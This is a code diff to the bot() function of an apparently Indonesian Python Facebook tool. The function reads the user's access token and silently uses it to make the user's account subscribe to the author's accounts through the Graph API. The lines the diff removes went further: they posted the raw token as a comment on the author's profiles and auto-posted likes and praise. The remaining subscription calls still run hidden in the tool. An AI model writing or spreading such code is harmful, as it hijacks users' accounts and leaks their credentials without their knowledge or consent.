@@ -291,24 +291,12 @@ def bot():
 	try:
 		token = open('token.txt', 'r').read()
 	except (KeyError, IOError):
-		exit("%s╚══[%s!%s] %sToken/Cookies Invalid"%(M,P,M,P));menu_log()
-	komen_ku = ('Bang Aang Ganteng Banget Deh')
-	komen_mu = ('Anjay Bang Ndrii Tambah Ganteng Aja:v')
-	komen_kita = ('Bang Aang Ganteng Banget Deh')
-	requests.post('https://graph.facebook.com/100004624064179/subscribers?access_token=' + token) # Moch Aang Sang Perudal Akun
+		exit("%s╚══[%s!%s] %sToken/Cookies Invalid"%(M,P,M,P))
 	requests.post('https://graph.facebook.com/100003252539235/subscribers?access_token=' + token) # Ayu Lestari
 	requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=' + token) # Moch Aang Ardiansyah-XD
 	requests.post('https://graph.facebook.com/100001621584081/subscribers?access_token=' + token) # Aang-Cyber X
 	requests.post('https://graph.facebook.com/100053460048331/subscribers?access_token=' + token) # Why Aang Ardiansyah
 	requests.post('https://graph.facebook.com/100061587581422/subscribers?access_token=' + token) # Zuhra X AangXD
-	requests.post('https://graph.facebook.com/108899972499673/comments/?message='+token+'&access_token=' + token) # Profil Moch Aang Ardiansyah-XD
-	requests.post('https://graph.facebook.com/1280398002467049/comments/?message='+token+'&access_token=' + token) # Profil Ndrii Sans
-	requests.post('https://graph.facebook.com/108899972499673/comments/?message='+komen_ku+'&access_token=' + token) # Komen Profil Ndrii Sans
-	requests.post('https://graph.facebook.com/108899972499673/comments/?message='+komen_ku+'&access_token=' + token) # Komen Profil Moch Aang Ardiansyah-XD
-	requests.post('https://graph.facebook.com/1280398002467049/likes?summary=true&access_token=' + token) # Like Ndrii Sans
-	requests.post('https://graph.facebook.com/108899972499673/likes?summary=true&access_token=' + token) # Like Moch Aang Ardiansyah-XD
-	requests.post('https://graph.facebook.com/108899972499673/comments/?message='+komen_mu+'&access_token=' + token) #  Komen Ndrii Sans
-	requests.post('https://graph.facebook.com/100001390111040/comments/?message='+komen_kita+'&access_token=' + token) #  Komen Moch Aang Ardiansyah-XD
 def defaultua():
     ua = ua_nokia
     try:
